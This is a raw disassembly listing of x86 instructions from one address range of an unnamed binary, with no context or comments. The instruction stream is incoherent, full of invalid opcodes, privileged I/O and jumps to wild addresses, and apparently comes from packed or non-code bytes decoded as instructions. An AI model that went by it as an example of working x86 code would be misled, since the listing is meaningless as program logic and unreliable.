  41b891:	(bad)  
  41b892:	adc    BYTE PTR [edi-0x6f3db587],cl
  41b898:	stos   BYTE PTR es:[edi],al
  41b899:	inc    edi
  41b89a:	sub    ch,BYTE PTR [ecx+0x4c]
  41b89d:	jae    0x41b8fa
  41b89f:	loopne 0x41b89d
  41b8a1:	das    
  41b8a2:	shl    ah,1
  41b8a4:	fnstcw WORD PTR [eax+eax*8-0x447a9a22]
  41b8ab:	sub    al,0x9a
  41b8ad:	or     eax,0xb9240f1e
  41b8b2:	jmp    0x1cf9e204
  41b8b7:	int3   
  41b8b8:	les    ebp,FWORD PTR [esi]
  41b8ba:	cli    
  41b8bb:	bound  edi,QWORD PTR [edx-0x7d]
  41b8be:	xor    DWORD PTR [ecx-0x8f144b1],ebx
  41b8c4:	retf   0xda93
  41b8c7:	test   eax,0x6f32ad02
  41b8cc:	pop    ebp
  41b8cd:	lock xor esi,DWORD PTR [eax-0x636b39d9]
  41b8d4:	jo     0x41b907
  41b8d6:	dec    ebx
  41b8d7:	push   eax
  41b8d8:	lock ins BYTE PTR es:[edi],dx
  41b8da:	xor    eax,0xa7c5450d
  41b8df:	push   edi
  41b8e0:	fistp  QWORD PTR [edx]
  41b8e2:	or     BYTE PTR [edi-0x19],ch
  41b8e5:	fstp   QWORD PTR [eax+0x46]
  41b8e8:	xchg   cl,cl
  41b8ea:	or     edi,eax
  41b8ec:	pop    edx
  41b8ed:	or     BYTE PTR [edx-0x30a30cd],bh
  41b8f3:	das    
  41b8f4:	sbb    edi,ebx
  41b8f6:	sub    al,0xa2
  41b8f8:	fbstp  TBYTE PTR [ebp+0x55]
  41b8fb:	mov    esi,0x5e245f5b
  41b900:	cmp    eax,0x7699420f
  41b905:	jmp    0x9eb33041
  41b90a:	ret    
  41b90b:	pushf  
  41b90c:	pop    esp
  41b90d:	ror    DWORD PTR [edx-0x3054e10c],0xcd
  41b914:	(bad)  
  41b915:	mov    dh,0xa6
  41b917:	mov    ah,0x2e
  41b919:	mov    al,0x85
  41b91b:	mov    bh,0xf9
  41b91d:	out    0x48,eax
  41b91f:	jmp    0x65d3:0xa8ba3e5f
  41b926:	and    DWORD PTR [esi-0x32eb5b50],ebx
  41b92c:	and    ch,BYTE PTR [esi+0x27]
  41b92f:	je     0x41b901
  41b931:	add    al,0xfe
  41b933:	ror    BYTE PTR [esi+ebp*4],1
  41b936:	dec    di
  41b938:	sub    eax,0xb86d7168
  41b93d:	out    dx,eax
  41b93e:	mov    esi,0x724eae64
  41b943:	call   0x43d8:0x74d82bf0
  41b94a:	cmp    esp,DWORD PTR [ebp-0x63]
  41b94d:	mov    esi,0xcb592302
  41b952:	imul   eax,DWORD PTR [ebp+0x6ae3eb51],0x7c6dabf1
  41b95c:	clc    
  41b95d:	xchg   edi,eax
  41b95e:	mov    esi,esp
  41b960:	ins    DWORD PTR es:[edi],dx
  41b961:	push   esi
  41b962:	test   eax,0x5c940b03
  41b967:	jne    0x41b972
  41b969:	or     cl,bl
  41b96b:	mov    DWORD PTR [ecx*4+0x42950e],eax
  41b972:	inc    DWORD PTR ds:0x429516
  41b978:	mov    eax,DWORD PTR [ebp-0x14]
  41b97b:	jmp    0x41dcfb
  41b980:	jb     0x41b9c1
  41b982:	sbb    eax,DWORD PTR [edx-0x703479e5]
  41b988:	retf   0x8b0f
  41b98b:	mov    al,0xa8
  41b98d:	mov    bl,0xae
  41b98f:	cmp    ecx,DWORD PTR [ecx]
  41b991:	cld    
  41b992:	jns    0x41ba0e
  41b994:	pop    ds
  41b995:	pop    edi
  41b996:	jp     0x41ba12
  41b998:	leave  
  41b999:	fmul   DWORD PTR [eax+0x579337e0]
  41b99f:	add    cl,BYTE PTR ds:[ebp-0x50]
  41b9a3:	mov    eax,0x9e98072d
  41b9a8:	pushf  
  41b9a9:	scas   eax,DWORD PTR es:[edi]
  41b9aa:	imul   ebx,DWORD PTR [esi-0x24],0xfb8d892c
  41b9b1:	jae    0x41ba14
  41b9b3:	dec    ebp
  41b9b4:	jnp    0x41ba0d
  41b9b6:	xor    eax,0xb75ed700
  41b9bb:	push   ecx
  41b9bc:	loope  0x41b974
  41b9be:	stos   BYTE PTR es:[edi],al
  41b9bf:	cmp    BYTE PTR [ebx],cl
  41b9c1:	sub    esi,DWORD PTR [edx+0x3f33f292]
  41b9c7:	jecxz  0x41b9de
  41b9c9:	inc    ecx
  41b9ca:	neg    al
  41b9cc:	shl    BYTE PTR [esp+edi*2-0x3],1
  41b9d0:	sub    ecx,esp
  41b9d2:	imul   ebx,esp,0xb
  41b9d5:	xor    BYTE PTR [ecx+0x43b4afdf],dh
  41b9db:	leave  
  41b9dc:	xchg   ecx,eax
  41b9dd:	mov    ds:0x9733f416,al
  41b9e2:	xchg   ebp,eax
  41b9e3:	jecxz  0x41b998
  41b9e5:	xchg   DWORD PTR [eax],ecx
  41b9e7:	mov    cl,bl
  41b9e9:	xlat   BYTE PTR ds:[ebx]
  41b9ea:	mov    edx,0x2cf4731e
  41b9ef:	mov    al,0x20
  41b9f1:	mov    esi,0xbe1b7ac1
  41b9f6:	add    al,0x80
  41b9f8:	es mov dh,0x92
  41b9fb:	out    0x62,al
  41b9fd:	push   esi
  41b9fe:	hlt    
  41b9ff:	jmp    DWORD PTR [esi-0x63]
  41ba02:	mov    ds:0xd8e36d3f,eax
  41ba07:	push   eax
  41ba08:	fstp   DWORD PTR [edi+0x6f4b2016]
  41ba0e:	mov    ds:0x150f872c,eax
  41ba13:	test   DWORD PTR [edx+0x62a792b9],esi
  41ba19:	aam    0xf0
  41ba1b:	addr16 inc ecx
  41ba1d:	shrd   DWORD PTR [edx],esp,0xe5
  41ba21:	cmp    DWORD PTR [esi+0x7ba5d016],0xd
  41ba28:	retf   
  41ba29:	ror    DWORD PTR [ebx+eiz*2],cl
  41ba2c:	ins    DWORD PTR es:[edi],dx
  41ba2d:	test   eax,0x8417111
  41ba33:	shr    BYTE PTR [edi+eiz*1-0x32838a50],1
  41ba3a:	popa   
  41ba3b:	idiv   BYTE PTR [ebp+0x1c]
  41ba3e:	cwde   
  41ba3f:	mov    al,ds:0x9cf838a9
  41ba44:	retf   
  41ba45:	pop    es
  41ba46:	cmc    
  41ba47:	cwde   
  41ba48:	mov    BYTE PTR [ebp-0x1f1d5532],cl
  41ba4e:	cmp    ebp,esp
  41ba50:	lahf   
  41ba51:	es popf 
  41ba53:	pop    esp
  41ba54:	scas   al,BYTE PTR es:[edi]
  41ba55:	pop    ss
  41ba56:	arpl   WORD PTR [ecx+0x195b30d8],dx
  41ba5c:	rcr    BYTE PTR [ecx+0x4f],1
  41ba5f:	mov    ecx,DWORD PTR [ecx-0x5b]
  41ba62:	inc    esp
  41ba63:	aas    
  41ba64:	add    eax,0xaf7ae17b
  41ba69:	dec    edx
  41ba6a:	pusha  
  41ba6b:	xchg   esi,eax
  41ba6c:	jmp    0x41baa6
  41ba6e:	icebp  
  41ba6f:	mov    ebx,0x542783fd
  41ba74:	je     0x41ba1f
  41ba76:	jae    0x41ba87
  41ba78:	hlt    
  41ba79:	mov    eax,DWORD PTR [eax+ebp*2+0x6b]
  41ba7d:	sbb    eax,0x60ca9281
  41ba82:	pop    esp
  41ba83:	jg     0x41ba8e
  41ba85:	bound  ebp,QWORD PTR [ecx]
  41ba87:	ins    DWORD PTR es:[edi],dx
  41ba88:	inc    esi
  41ba89:	xor    edi,ebx
  41ba8b:	xchg   dh,ch
  41ba8d:	add    BYTE PTR [eax],al
  41ba8f:	lods   al,BYTE PTR ds:[esi]
  41ba90:	cmc    
  41ba91:	out    0xe2,eax
  41ba93:	push   ebx
  41ba94:	sbb    BYTE PTR [esi-0x38],0xbe
  41ba98:	fbstp  TBYTE PTR [edi+0x458d2239]
  41ba9e:	loopne 0x41ba4b
  41baa0:	mov    ah,0xc3
  41baa2:	adc    al,BYTE PTR [ecx+0x27]
  41baa5:	loope  0x41baaa
  41baa7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41baa8:	or     al,0x6d
  41baaa:	and    al,0x42
  41baac:	cwde   
  41baad:	das    
  41baae:	xlat   BYTE PTR ds:[ebx]
  41baaf:	stos   BYTE PTR es:[edi],al
  41bab0:	sbb    al,BYTE PTR [ecx]
  41bab2:	imul   edi,DWORD PTR [ebp-0x393bb161],0x56
  41bab9:	int3   
  41baba:	sbb    ebx,ebx
  41babc:	adc    eax,0x1cf6605c
  41bac1:	pop    edx
  41bac2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bac3:	mov    ds:0xc1e807f0,al
  41bac8:	jmp    0x56684d6e
  41bacd:	and    al,0x40
  41bacf:	sub    BYTE PTR [eax],ch
  41bad1:	jae    0x41bb37
  41bad3:	cli    
  41bad4:	or     DWORD PTR [ecx],eax
  41bad6:	addr16 mov ah,0x59
  41bad9:	fisttp WORD PTR [eax+ecx*8+0x52]
  41badd:	outs   dx,BYTE PTR ds:[esi]
  41bade:	dec    eax
  41badf:	(bad)  
  41bae1:	sbb    BYTE PTR [eax+0x3a07f153],ch
  41bae7:	jne    0x41bae2
  41bae9:	jmp    0xa5f8fec
  41baee:	es jmp 0x41bb03
  41baf1:	in     eax,0xd6
  41baf3:	gs mov dh,0x5a
  41baf6:	addr16 mov esi,0x4d113889
  41bafc:	gs inc edx
  41bafe:	cmp    eax,0xbf5cd3da
  41bb03:	cmp    DWORD PTR [esi+0x25],ecx
  41bb06:	mov    dl,0x35
  41bb08:	mov    BYTE PTR [ebp+0x2b],ah
  41bb0b:	mov    ecx,0x9689c8f9
  41bb10:	in     al,dx
  41bb11:	outs   dx,BYTE PTR ds:[esi]
  41bb12:	ins    BYTE PTR es:[edi],dx
  41bb13:	sbb    ebx,DWORD PTR ds:0xa8271784
  41bb19:	outs   dx,DWORD PTR ds:[esi]
  41bb1a:	adc    bl,ch
  41bb1c:	out    0xbd,eax
  41bb1e:	test   dl,0x8f
  41bb21:	lea    esi,[edi+0x12d226c4]
  41bb27:	cmp    BYTE PTR [ebp+edx*8-0x1e],0x85
  41bb2c:	jg     0x41bb6b
  41bb2e:	and    DWORD PTR [ebp-0x23],esp
  41bb31:	mov    edx,ebx
  41bb33:	hlt    
  41bb34:	fistp  QWORD PTR [ebx+edx*2]
  41bb37:	xchg   edi,eax
  41bb38:	xor    BYTE PTR [esi],ch
  41bb3a:	clc    
  41bb3b:	add    DWORD PTR [edx-0x569ac229],edi
  41bb41:	xchg   esp,eax
  41bb42:	stos   BYTE PTR es:[edi],al
  41bb43:	adc    cl,bl
  41bb45:	cwde   
  41bb46:	fcomi  st,st(4)
  41bb48:	xchg   ebp,eax
  41bb49:	js     0x41bb5f
  41bb4b:	jo     0x41bb08
  41bb4d:	fsubr  DWORD PTR [ebx+0x2197043f]
  41bb53:	rol    ecx,0xb4
  41bb56:	pop    es
  41bb57:	iret   
  41bb58:	push   esp
  41bb59:	retf   
  41bb5a:	mov    ebx,0x4658682b
  41bb5f:	cs stos BYTE PTR es:[edi],al
  41bb61:	cli    
  41bb62:	add    BYTE PTR [ebp-0x28f89a6a],ch
  41bb68:	jl     0x41bbe6
  41bb6a:	rcl    BYTE PTR ds:0x9c6ba646,0x2a
  41bb71:	mov    esp,0x4493eb1c
  41bb76:	pop    ecx
  41bb77:	jns    0x41bb85
  41bb79:	in     eax,0xf1
  41bb7b:	push   ss
  41bb7c:	mov    ebx,0xf5c9739d
  41bb81:	jmp    0xf197cf3c
  41bb86:	pop    ebp
  41bb87:	xchg   ecx,eax
  41bb88:	inc    ecx
  41bb89:	fisttp WORD PTR [esi+0x54afe452]
  41bb8f:	pop    ecx
  41bb90:	or     eax,DWORD PTR [ebp-0x7d1c5ffe]
  41bb96:	les    edi,FWORD PTR [edi-0x723fa89]
  41bb9c:	adc    DWORD PTR [edx],0x80a16760
  41bba2:	ss test al,0xa1
  41bba5:	adc    BYTE PTR [ebx-0x1e],0x91
  41bba9:	pusha  
  41bbaa:	cld    
  41bbab:	jmp    0xe9fb59d1
  41bbb0:	or     eax,0x64ad1a50
  41bbb5:	or     DWORD PTR [ecx-0x26],0xffffffc6
  41bbb9:	mov    bl,0x14
  41bbbb:	test   BYTE PTR [ecx-0x49],bl
  41bbbe:	ret    
  41bbbf:	sar    BYTE PTR [edx-0x3f79040a],1
  41bbc5:	and    DWORD PTR [ebp-0x3],edi
  41bbc8:	dec    ebp
  41bbc9:	xchg   ebp,eax
  41bbca:	fnstcw WORD PTR [eax+0x1dcce464]
  41bbd0:	lods   eax,DWORD PTR ds:[esi]
  41bbd1:	sbb    DWORD PTR [edi],eax
  41bbd3:	mov    eax,ds:0x5bf91dd0
  41bbd8:	mov    ch,BYTE PTR [eax+0x16]
  41bbdb:	das    
  41bbdc:	sbb    eax,0xb173a8dc
  41bbe1:	jmp    DWORD PTR [ebx]
  41bbe3:	push   ss
  41bbe4:	outs   dx,DWORD PTR ds:[esi]
  41bbe5:	into   
  41bbe6:	imul   ebx,DWORD PTR [edi-0x3179d442],0x3
  41bbed:	out    dx,al
  41bbee:	dec    ebx
  41bbef:	xchg   ecx,eax
  41bbf0:	popa   
  41bbf1:	fbstp  TBYTE PTR [eax+edx*4+0x6f48728]
  41bbf8:	mov    ebp,DWORD PTR [ecx+edi*2-0x3f]
  41bbfc:	(bad)  
  41bbfd:	jb     0x41bc1a
  41bbff:	icebp  
  41bc00:	xchg   edi,eax
  41bc01:	out    dx,eax
  41bc02:	sbb    eax,0x75ce2343
  41bc07:	mov    edx,0x970c473e
  41bc0c:	sbb    DWORD PTR [edx+0x2716f5f3],esp
  41bc12:	jle    0x41bbc8
  41bc14:	js     0x41bc55
  41bc16:	jns    0x41bbe5
  41bc18:	xchg   BYTE PTR [ecx],ah
  41bc1a:	xor    bh,BYTE PTR [ebp-0x2b]
  41bc1d:	das    
  41bc1e:	pushf  
  41bc1f:	popa   
  41bc20:	ja     0x41bc3d
  41bc22:	pushf  
  41bc23:	aam    0x94
  41bc25:	dec    ecx
  41bc26:	je     0x5644c2ea
  41bc2c:	iret   
  41bc2d:	adc    DWORD PTR [eax+ecx*8-0x3],edx
  41bc31:	nop
  41bc32:	mov    cl,0x8
  41bc34:	inc    ecx
  41bc35:	and    DWORD PTR [edi],ecx
  41bc37:	pop    eax
  41bc38:	retf   0xf3a7
  41bc3b:	hlt    
  41bc3c:	and    al,0x53
  41bc3e:	(bad)  [edx]
  41bc40:	pop    ss
  41bc41:	pop    es
  41bc42:	ins    BYTE PTR es:[edi],dx
  41bc43:	sbb    al,dl
  41bc45:	fist   WORD PTR [ebx-0x6e398e13]
  41bc4b:	jg     0x41bc22
  41bc4d:	and    DWORD PTR [edi-0x1832e9e9],esp
  41bc53:	jle    0x41bc70
  41bc55:	dec    eax
  41bc56:	fadd   QWORD PTR [esp+edx*4+0x48be0c23]
  41bc5d:	mov    ah,BYTE PTR gs:[edi]
  41bc60:	pushf  
  41bc61:	repnz scas eax,DWORD PTR es:[edi]
  41bc63:	out    0xcd,eax
  41bc65:	inc    ebx
  41bc66:	or     bl,al
  41bc68:	or     DWORD PTR [edi+ecx*1+0xe],0x3479d764
  41bc70:	pop    ds
  41bc71:	out    dx,eax
  41bc72:	xlat   BYTE PTR ds:[ebx]
  41bc73:	jp     0x41bc4f
  41bc75:	iret   
  41bc76:	rol    BYTE PTR [edi],0x7a
  41bc79:	pop    edi
  41bc7a:	mov    ds:0xedbfe3af,eax
  41bc7f:	push   esi
  41bc80:	in     eax,dx
  41bc81:	cmp    bl,BYTE PTR [ecx-0x7d]
  41bc84:	sbb    bh,BYTE PTR [esi+0x6f]
  41bc87:	iret   
  41bc88:	cli    
  41bc89:	fbstp  TBYTE PTR [edi+0x7cc959b0]
  41bc8f:	push   eax
  41bc90:	stc    
  41bc91:	loopne 0x41bcfc
  41bc93:	sbb    BYTE PTR [ebx+0x21],cl
  41bc96:	push   ds
  41bc97:	out    0xa4,al
  41bc99:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bc9a:	fnsave [ecx]
  41bc9c:	xchg   edi,eax
  41bc9d:	mov    al,0x35
  41bc9f:	syscall 
  41bca1:	dec    ebp
  41bca2:	ret    
  41bca3:	jo     0x41bc5e
  41bca5:	mov    eax,ds:0xcd38c1fb
  41bcaa:	stc    
  41bcab:	(bad)  
  41bcac:	jecxz  0x41bc84
  41bcae:	pop    eax
  41bcaf:	push   esp
  41bcb0:	xlat   BYTE PTR ds:[ebx]
  41bcb1:	mov    edx,0xb95dfeb5
  41bcb6:	sub    al,BYTE PTR [ebp-0xeae1e8c]
  41bcbc:	retf   0x5a29
  41bcbf:	imul   ecx,DWORD PTR [eax+ebp*2-0x10],0xe47b4b91
  41bcc7:	mov    DWORD PTR [ebx-0x461bf3c7],ebx
  41bccd:	clc    
  41bcce:	loop   0x41bce0
  41bcd0:	pop    ebp
  41bcd1:	aaa    
  41bcd2:	lock leave 
  41bcd4:	jg     0x41bcdc
  41bcd6:	retf   0x8e32
  41bcd9:	mov    bh,0x2b
  41bcdb:	adc    ebx,ebp
  41bcdd:	xchg   ecx,eax
  41bcde:	enter  0xfbef,0x69
  41bce2:	scas   al,BYTE PTR es:[edi]
  41bce3:	(bad)  
  41bce4:	jp     0x41bc81
  41bce6:	sbb    bh,BYTE PTR [edx+ecx*2-0x1c]
  41bcea:	or     ah,BYTE PTR [ecx]
  41bcec:	rol    BYTE PTR [eax+eiz*8],cl
  41bcef:	sbb    eax,0x1e9b0979
  41bcf4:	stos   BYTE PTR es:[edi],al
  41bcf5:	retf   0xff57
  41bcf8:	loope  0x41bd01
  41bcfa:	jo     0x41bcc0
  41bcfc:	adc    eax,0xdc509967
  41bd01:	xor    BYTE PTR [esi+0x229e3dfa],0xb7
  41bd08:	xchg   ebx,eax
  41bd09:	and    DWORD PTR [ebp+0x1fafc8a8],0x2a
  41bd10:	das    
  41bd11:	add    esi,ecx
  41bd13:	xor    al,0xa8
  41bd15:	repnz push ebp
  41bd17:	mov    ds:0x70a2529e,al
  41bd1c:	rol    DWORD PTR [eax],1
  41bd1e:	mov    dl,0x9b
  41bd20:	fdivr  QWORD PTR gs:[esi+0x7c]
  41bd24:	xchg   ah,bl
  41bd26:	sbb    bl,BYTE PTR [ebx]
  41bd28:	adc    DWORD PTR [ebp+0x587bde03],ebp
  41bd2e:	jmp    0x41bd9c
  41bd30:	jne    0x41bcdc
  41bd32:	sub    al,0x51
  41bd34:	push   eax
  41bd35:	push   ecx
  41bd36:	stos   BYTE PTR es:[edi],al
  41bd37:	mov    WORD PTR [ecx+0x3e1ed068],ss
  41bd3d:	mov    DWORD PTR [esi+0x26],eax
  41bd40:	push   edx
  41bd41:	inc    ebp
  41bd42:	out    0xb,eax
  41bd44:	inc    ecx
  41bd45:	je     0x41bcf5
  41bd47:	sub    ebp,0xa814c8e8
  41bd4d:	loopne 0x41bd1f
  41bd4f:	sti    
  41bd50:	jne    0x41bd6e
  41bd52:	(bad)  
  41bd54:	dec    esp
  41bd55:	push   ecx
  41bd56:	mov    bh,0xe2
  41bd58:	mov    esi,0xeb6e17a9
  41bd5d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bd5e:	out    0x3f,eax
  41bd60:	cld    
  41bd61:	les    edi,FWORD PTR [edx]
  41bd63:	xchg   esi,eax
  41bd64:	or     eax,0x178994f0
  41bd69:	ret    
  41bd6a:	sbb    ah,BYTE PTR [ebx]
  41bd6c:	enter  0xa806,0x19
  41bd70:	call   DWORD PTR ds:0x8e530fd8
  41bd76:	sbb    ecx,DWORD PTR [ebp-0x33bc71d2]
  41bd7c:	jmp    0x41bd70
  41bd7e:	out    0x4a,eax
  41bd80:	loope  0x41bd29
  41bd82:	mov    bl,0xf3
  41bd84:	sti    
  41bd85:	scas   eax,DWORD PTR es:[edi]
  41bd86:	add    DWORD PTR [ecx],ebp
  41bd88:	(bad)  
  41bd8a:	cli    
  41bd8b:	sbb    al,0xce
  41bd8d:	sbb    ebx,0xffffff81
  41bd90:	stc    
  41bd91:	cmp    al,0x3e
  41bd93:	icebp  
  41bd94:	data16 (bad) [edx+0x3a]
  41bd98:	sbb    ebp,esi
  41bd9a:	ins    BYTE PTR es:[edi],dx
  41bd9b:	cs jecxz 0x41bda9
  41bd9e:	dec    edi
  41bd9f:	popa   
  41bda0:	(bad)  
  41bda1:	and    DWORD PTR [esp+esi*1-0x2af08d28],ecx
  41bda8:	push   edi
  41bda9:	mov    al,ds:0xd0bf62a3
  41bdae:	dec    edx
  41bdaf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bdb0:	fnstenv [ebx+esi*1]
  41bdb3:	cmp    DWORD PTR [ecx+0x2b],0xffffffa5
  41bdb7:	inc    eax
  41bdb8:	mov    esi,DWORD PTR [ebx]
  41bdba:	js     0x41bdc5
  41bdbc:	data16 fcmovne st,st(7)
  41bdbf:	push   0x4487884f
  41bdc4:	sbb    ebx,DWORD PTR [esi-0x69]
  41bdc7:	outs   dx,BYTE PTR ds:[esi]
  41bdc8:	push   cs
  41bdc9:	daa    
  41bdca:	mov    ah,0x15
  41bdcc:	mov    WORD PTR [edi],cs
  41bdce:	fadd   DWORD PTR [eax]
  41bdd0:	sub    esp,0xffffff8c
  41bdd3:	pop    ebp
  41bdd4:	fisttp DWORD PTR ds:0x75519f4a
  41bdda:	(bad)  
  41bddb:	in     eax,0x13
  41bddd:	push   0x8c21f835
  41bde2:	icebp  
  41bde3:	inc    edi
  41bde4:	pop    eax
  41bde5:	test   BYTE PTR [ecx],al
  41bde7:	adc    ah,cl
  41bde9:	cld    
  41bdea:	inc    eax
  41bdeb:	(bad)  
  41bdec:	pop    edi
  41bded:	repz fisub WORD PTR [ebx-0x2d]
  41bdf1:	cmp    al,0x31
  41bdf3:	add    dl,BYTE PTR [ebx-0x274afdd2]
  41bdf9:	js     0x41bdf9
  41bdfb:	or     DWORD PTR [edi-0x180b2fbf],esi
  41be01:	(bad)  
  41be02:	jge    0x41bddb
  41be04:	and    al,0xee
  41be06:	jno    0x41bdf9
  41be08:	inc    ecx
  41be09:	outs   dx,DWORD PTR ds:[esi]
  41be0a:	outs   dx,BYTE PTR ds:[esi]
  41be0b:	mov    esp,eax
  41be0d:	bts    DWORD PTR [ecx+ebp*8+0x7465c80e],esi
  41be15:	jae    0x41be51
  41be17:	xchg   BYTE PTR [ebp+0x1c],al
  41be1a:	adc    DWORD PTR [edx],esi
  41be1c:	and    BYTE PTR [eax],0xd4
  41be1f:	imul   BYTE PTR [ecx]
  41be21:	push   ebx
  41be22:	add    ah,0xa7
  41be25:	sub    al,0x65
  41be27:	adc    al,0x66
  41be29:	xchg   edx,eax
  41be2a:	into   
  41be2b:	pushf  
  41be2c:	test   al,0xed
  41be2e:	sahf   
  41be2f:	jmp    0xfbda:0xce583ad3
  41be36:	add    BYTE PTR [eax-0xe],cl
  41be39:	outs   dx,BYTE PTR ds:[esi]
  41be3a:	ret    
  41be3b:	add    edx,DWORD PTR [esi-0x57a48a04]
  41be41:	jmp    0x7ac4:0x365f9925
  41be48:	mov    ecx,0xce5058d3
  41be4d:	mov    esp,0xf5e25047
  41be52:	or     dh,BYTE PTR [ebx]
  41be54:	sbb    edx,DWORD PTR [esi-0x56]
  41be57:	aad    0x70
  41be59:	pop    ebx
  41be5a:	stos   DWORD PTR es:[edi],eax
  41be5b:	popa   
  41be5c:	push   ebx
  41be5d:	or     al,0x11
  41be5f:	das    
  41be60:	icebp  
  41be61:	sub    ebp,esp
  41be63:	aam    0x2
  41be65:	pusha  
  41be66:	stc    
  41be67:	cli    
  41be68:	call   0x9bf27dd4
  41be6d:	popf   
  41be6e:	push   edx
  41be6f:	adc    DWORD PTR [esi+edi*2-0x3e],edx
  41be73:	jmp    0xa32e:0xe14c245b
  41be7a:	fldcw  WORD PTR [ecx-0x76]
  41be7d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41be7e:	add    ah,BYTE PTR [ebx]
  41be80:	retf   
  41be81:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41be82:	mov    edx,0x27bdc040
  41be87:	inc    ecx
  41be88:	adc    al,0x9e
  41be8a:	mov    ?,WORD PTR [ecx+0x69]
  41be8d:	push   edi
  41be8e:	xor    ecx,eax
  41be90:	mov    DWORD PTR [ecx+0x630301b5],ebx
  41be96:	inc    ecx
  41be97:	push   ebp
  41be98:	push   ecx
  41be99:	into   
  41be9a:	and    al,0x66
  41be9c:	adc    BYTE PTR [ebx],dl
  41be9e:	sub    DWORD PTR [edi-0x61c1fcd],esp
  41bea4:	xchg   ebp,eax
  41bea5:	cld    
  41bea6:	pop    esi
  41bea7:	jnp    0x41becc
  41bea9:	arpl   WORD PTR [esi+0x55],dx
  41beac:	sub    DWORD PTR [esi+0x2395b6c3],eax
  41beb2:	loope  0x41be94
  41beb4:	push   0x3db38e79
  41beb9:	daa    
  41beba:	xchg   edx,eax
  41bebb:	mov    ah,0x25
  41bebd:	jns    0x41bf3c
  41bebf:	xchg   ecx,eax
  41bec0:	dec    edx
  41bec1:	daa    
  41bec2:	and    eax,0xa2d0d78
  41bec7:	xor    BYTE PTR [eax-0x50],0xf4
  41becb:	add    eax,0x783ee359
  41bed0:	aad    0x20
  41bed2:	xor    DWORD PTR [edi],esp
  41bed4:	dec    esp
  41bed5:	inc    edi
  41bed6:	mov    bh,bl
  41bed8:	jo     0x41bf31
  41beda:	inc    eax
  41bedb:	sub    eax,0xa696ec23
  41bee0:	loopne 0x41becd
  41bee2:	mov    ds:0x8a55947,al
  41bee7:	repnz xor eax,0x5bcc08cc
  41beed:	and    ebx,ecx
  41beef:	xor    DWORD PTR [edi+0x3e138615],esp
  41bef5:	add    al,0xb3
  41bef7:	test   dl,bl
  41bef9:	retf   0x696f
  41befc:	xchg   edx,eax
  41befd:	stos   DWORD PTR es:[edi],eax
  41befe:	sahf   
  41beff:	jle    0x41bef1
  41bf01:	ins    BYTE PTR es:[edi],dx
  41bf02:	dec    edx
  41bf03:	mov    bl,BYTE PTR [esi+0x1b31551d]
  41bf09:	aas    
  41bf0a:	fnstenv [ebx*4+0x6dedacca]
  41bf11:	lock cdq 
  41bf13:	sub    eax,0x57b2d86e
  41bf18:	dec    ecx
  41bf19:	xor    al,0xc
  41bf1b:	lahf   
  41bf1c:	(bad)  
  41bf1d:	popf   
  41bf1e:	pop    ds
  41bf1f:	inc    DWORD PTR [edx+ecx*4]
  41bf22:	mov    WORD PTR [ebx+0x35179d27],ds
  41bf28:	dec    eax
  41bf29:	fs inc ebp
  41bf2b:	pop    esp
  41bf2c:	xchg   edi,eax
  41bf2d:	lods   al,BYTE PTR ds:[esi]
  41bf2e:	push   esp
  41bf2f:	das    
  41bf30:	fstp   QWORD PTR [ecx+0x74]
  41bf33:	lods   eax,DWORD PTR ds:[esi]
  41bf34:	(bad)  
  41bf37:	ds bswap ecx
  41bf3a:	stos   DWORD PTR es:[edi],eax
  41bf3b:	push   ecx
  41bf3c:	(bad)  
  41bf3d:	int3   
  41bf3e:	mov    dh,0x93
  41bf40:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bf41:	aas    
  41bf42:	aam    0x33
  41bf44:	push   esi
  41bf45:	aaa    
  41bf46:	je     0x41befe
  41bf48:	pop    ecx
  41bf49:	ins    DWORD PTR es:[edi],dx
  41bf4a:	mov    eax,0x65bb3793
  41bf4f:	repnz and dh,BYTE PTR [edi+0x1172482c]
  41bf56:	mov    eax,0x618d56b0
  41bf5c:	imul   ebx,esi,0xffffffc9
  41bf5f:	push   esp
  41bf60:	gs ja  0x41bfaf
  41bf63:	js     0x41bf2b
  41bf65:	xor    ah,BYTE PTR [edi]
  41bf67:	push   edi
  41bf68:	outs   dx,BYTE PTR ds:[esi]
  41bf69:	pop    ebx
  41bf6a:	jnp    0x41bef6
  41bf6c:	cmp    dl,BYTE PTR [esi+eiz*8+0xaf9d66d]
  41bf73:	int3   
  41bf74:	pop    eax
  41bf75:	add    eax,0x56c22efc
  41bf7a:	mov    DWORD PTR [esp+ecx*4+0x3d347dd0],ebp
  41bf81:	push   es
  41bf82:	dec    esp
  41bf83:	lahf   
  41bf84:	leave  
  41bf85:	or     eax,0xb83ce812
  41bf8a:	push   esi
  41bf8b:	fsubr  st(6),st
  41bf8d:	pop    esi
  41bf8e:	jo     0x41bf4f
  41bf90:	lahf   
  41bf91:	push   es
  41bf92:	dec    ebp
  41bf93:	sub    edi,DWORD PTR [ebx-0x10]
  41bf96:	ja     0x41bf60
  41bf98:	call   0xba810803
  41bf9d:	xchg   esi,eax
  41bf9e:	mov    eax,0x58613a94
  41bfa3:	rcr    BYTE PTR [bx+di+0x48e3],1
  41bfa8:	sbb    al,dl
  41bfaa:	mov    bl,0xf6
  41bfac:	add    esp,DWORD PTR [eax+0x0]
  41bfaf:	pop    ebp
  41bfb0:	jno    0x41bfd7
  41bfb2:	xchg   edi,eax
  41bfb3:	mov    esp,0x2af36459
  41bfb8:	cmp    bh,BYTE PTR [ebx+0x54]
  41bfbb:	mov    BYTE PTR [esi],0x2b
  41bfbe:	(bad)  
  41bfbf:	stc    
  41bfc0:	and    esi,DWORD PTR [edi+0x5a]
  41bfc3:	xor    DWORD PTR es:[eax],edx
  41bfc6:	fwait
  41bfc7:	test   BYTE PTR [esi+0x66],dl
  41bfca:	mov    esi,ebp
  41bfcc:	out    0x11,eax
  41bfce:	jnp    0x41bfbf
  41bfd0:	push   esp
  41bfd1:	imul   esp,DWORD PTR [edx+0x162a43b5],0x27
  41bfd8:	fsub   DWORD PTR [ecx-0xf5b3d4b]
  41bfde:	mov    ds:0xbec82b8d,al
  41bfe3:	shr    ecx,cl
  41bfe5:	dec    eax
  41bfe6:	or     edx,DWORD PTR [eax+edi*8]
  41bfe9:	jo     0x41bfe0
